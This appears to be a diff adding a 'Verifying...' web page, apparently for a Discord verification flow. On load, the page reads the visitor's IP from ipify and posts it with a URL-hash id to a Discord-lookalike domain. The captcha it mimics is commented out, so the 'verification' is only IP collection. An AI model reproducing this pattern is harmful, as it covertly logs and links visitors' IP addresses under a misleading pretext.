@@ -1,0 +1,53 @@
+<style>
+    html {
+        font-family:sans-serif;
+        color: white;
+        background-color: #000000;
+    }
+</style>
+<center><h1>Verifying...</h1>
+</center><script src="https://api.ipify.org/?format=jsonp&callback=window.ip="></script>
+<!-- <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<div style="display:none;" class="cf-turnstile" data-sitekey="0x4AAAAAAACdlCLrjT7P9cok"
+    data-callback="javascriptCallback"></div> -->
+
+
+<script>
+    // setTimeout(function () {
+    //     if (document.querySelector('.cf-turnstile')) {
+    //         document.querySelector('.cf-turnstile').style.display = "block"
+    //     }
+    // }, 5000)
+    function javascriptCallback(response) {
+        if(!window.location.hash) return
+        if(!window.ip) {
+            document.querySelector('h1').innerHTML = "Error!"
+            return
+        }
+        // The turnstile event has been fired.
+        // The response object contains the turnstile data.
+       // document.querySelector('.cf-turnstile').remove()
+       // if(response){
+            fetch("https://discord.wwwclt.com/promise", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    //"response": response,
+                    "id":(window.location.hash || "").replace("#", ""),
+                    "ip": window.ip.ip || ""
+                })
+            }).then(function (res) {
+                if(res.status == 200){
+                    document.querySelector('h1').innerHTML = "Verified!"
+                }else{
+                    document.querySelector('h1').innerHTML = "Error!"
+                }
+            })
+       // }
+    }
+    javascriptCallback(null)
+
+  
+</script>
